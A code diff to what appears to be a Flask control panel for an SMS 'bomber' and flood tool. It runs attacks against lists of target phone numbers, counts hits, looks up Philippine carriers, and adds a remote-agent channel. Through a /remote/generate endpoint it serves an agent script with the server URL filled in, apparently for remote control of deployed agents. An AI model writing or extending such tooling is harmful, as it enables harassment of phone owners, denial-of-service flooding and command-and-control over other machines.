@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
+from flask_socketio import SocketIO
 import asyncio
 import threading
 from functools import wraps
@@ -8,6 +9,7 @@ from core.engine import Engine
 from core.flood_engine import FloodEngine
 from core.tracker import Tracker
 from core.osint import OSINT
+from core.remote_engine import RemoteEngine
 from services.bomber_services import get_default_services
 import re
 import os
@@ -15,6 +17,7 @@ import gc
 
 app = Flask(__name__)
 app.secret_key = config.SESSION_SECRET
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 # Global Engines and State
 services = get_default_services()
@@ -22,6 +25,10 @@ bomber_engine = Engine(services)
 flood_engine = FloodEngine()
 tracker = Tracker()
 osint_tool = OSINT()
+remote_engine = RemoteEngine(socketio)
+
+# Register Remote Handlers
+remote_engine.register_handlers()
 
 state = {
     "active": False,
@@ -31,8 +38,19 @@ state = {
     "logs": [],
     "flood_requests": 0,
     "target_uptime": True,
-    "lock": threading.Lock()
+    "lock": threading.Lock(),
+    "global_hits": 0,
+    "global_fails": 0,
+    "total_targets": 0
 }
+
+def broadcast_stats():
+    socketio.emit('live_stats', {
+        "hits": state["global_hits"],
+        "fails": state["global_fails"],
+        "targets": state["total_targets"],
+        "active": state["active"]
+    })
 
 @app.route('/')
 def dashboard():
@@ -48,6 +66,10 @@ def start_signal():
 
     phones = [p.strip() for p in re.split(r'[,\n\r\s]+', phone_raw) if p.strip()]
     if not phones: return jsonify({"success": False, "error": "No targets"}), 400
+
+    with state["lock"]:
+        state["total_targets"] += len(phones)
+    broadcast_stats()
 
     valid_phones = []
     for phone in phones:
@@ -67,7 +89,10 @@ def start_signal():
             with state["lock"]:
                 state["success"] += success
                 state["failed"] += failed
+                state["global_hits"] += success
+                state["global_fails"] += failed
                 state["logs"].append({"msg": f"Dispatch Batch {batch}/{total}: {success} Hits", "type": "info"})
+            broadcast_stats()
 
         try:
             loop.run_until_complete(bomber_engine.run_attack(valid_phones, amount, selected_services, on_progress))
@@ -222,6 +247,56 @@ def carrier_inquiry(phone):
 def health_check():
     return jsonify({"status": "active", "load": 0.1})
 
+@app.route('/remote/clients')
+def get_remote_clients():
+    return jsonify(remote_engine.get_client_list())
+
+# --- REMOTE ACCESS & API ---
+@app.route('/api/stats')
+def get_stats():
+    return jsonify({
+        "hits": state["global_hits"],
+        "fails": state["global_fails"],
+        "targets": state["total_targets"],
+        "active_agents": len(remote_engine.agents)
+    })
+
+@app.route('/api/lookup/<phone>')
+async def lookup_phone(phone):
+    prefixes = {s.prefix: s.name for s in services if hasattr(s, 'prefix')}
+    # Fallback prefixes for PH
+    ph_prefixes = {
+        "0917": "Globe", "0918": "Smart", "0919": "Smart", "0920": "Smart",
+        "0921": "Smart", "0922": "Sun", "0923": "Sun", "0927": "Globe",
+        "0937": "Globe", "0947": "Smart", "0966": "Globe", "0977": "Globe",
+        "0998": "Smart", "0999": "Smart"
+    }
+    ph_prefixes.update(prefixes)
+    res = await osint_tool.phone_carrier_lookup(phone, ph_prefixes)
+    return jsonify(res)
+
+@app.route('/remote/generate')
+def generate_agent():
+    # Inject current domain into agent.py for the user
+    agent_path = os.path.join('client', 'agent.py')
+    if not os.path.exists(agent_path):
+        return "Agent source not found", 404
+        
+    with open(agent_path, 'r') as f:
+        content = f.read()
+    
+    # Replace SERVER_URL placeholder with actual domain
+    server_url = f"http://{request.host}"
+    if request.is_secure or 'render.com' in request.host:
+        server_url = f"https://{request.host}"
+        
+    content = content.replace('SERVER_URL = "http://localhost:5000"', f'SERVER_URL = "{server_url}"')
+    
+    return content, 200, {
+        'Content-Type': 'text/x-python',
+        'Content-Disposition': 'attachment; filename=agent_configured.py'
+    }
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    socketio.run(app, host='0.0.0.0', port=port, log_output=True)
